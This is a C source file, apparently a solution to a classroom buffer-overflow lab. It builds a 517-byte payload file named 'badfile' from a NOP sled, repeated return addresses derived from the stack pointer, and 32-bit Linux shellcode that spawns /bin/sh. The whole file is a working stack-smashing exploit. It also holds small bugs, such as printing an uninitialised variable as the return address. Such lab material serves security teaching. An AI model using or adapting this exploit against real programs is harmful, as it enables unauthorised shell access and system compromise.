/* exploit.c */

/* A program that creates a file containing code for launching shell*/

#include <stdlib.h>

#include <stdio.h>

#include <string.h>

#define DEFAULT_OFFSET 0

char shellcode[]= 
"\x31\xc0" /* xorl %eax,%eax */

"\x50" /* pushl %eax */

"\x68""//sh" /* pushl $0x68732f2f */

"\x68""/bin" /* pushl $0x6e69622f */

"\x89\xe3" /* movl %esp,%ebx */

"\x50" /* pushl %eax */

"\x53" /* pushl %ebx */

"\x89\xe1" /* movl %esp,%ecx */

"\x99" /* cdq */

"\xb0\x0b" /* movb $0x0b,%al */

"\xcd\x80" /* int $0x80 */

;


unsigned long get_sp(void){
  __asm__("movl %esp, %eax");
}

void main(int argc, char **argv)
{

char buffer[517];

FILE *badfile;
char *ptr;
long *addr_ptr, ret_addr;
long ret;

int offset = DEFAULT_OFFSET;


/* get size (in bytes) of shellcode and buffer */
int shellSize = sizeof(shellcode);
int buffSize = sizeof(buffer);

/* set offset via command line, otherwise default */
if(argc > 1){
offset = atoi(argv[1]);
}

/* set ptr and addr_ptr to buffer */
ptr = buffer;
addr_ptr = (long *) ptr;

/* Initialize buffer with 0x90 (NOP instruction) */
memset(&buffer, 0x90, buffSize);

/* You need to fill the buffer with appropriate contents here */

// set return address to stack pointer + offset 
// (offset is the amount to jump into code)
ret_addr = get_sp() + offset;
printf("Return Address: 0x%x\n", ret);

int i;

// set address pointer equal to return address
for(i = 0; i < buffSize/2; i+=4){
  *(addr_ptr++) = ret_addr;
}

int diff = buffSize - shellSize; // 517 - 25 = 492

// for final portion of buffer, inject the shellcode
for(i = diff; i < buffSize; i++){
  buffer[i] = shellcode[i - diff];
}


buffer[buffSize - 1] = '\0';

/* Save the contents to the file "badfile" */

badfile = fopen("./badfile", "w");

fwrite(buffer, 517, 1, badfile);

fclose(badfile);

}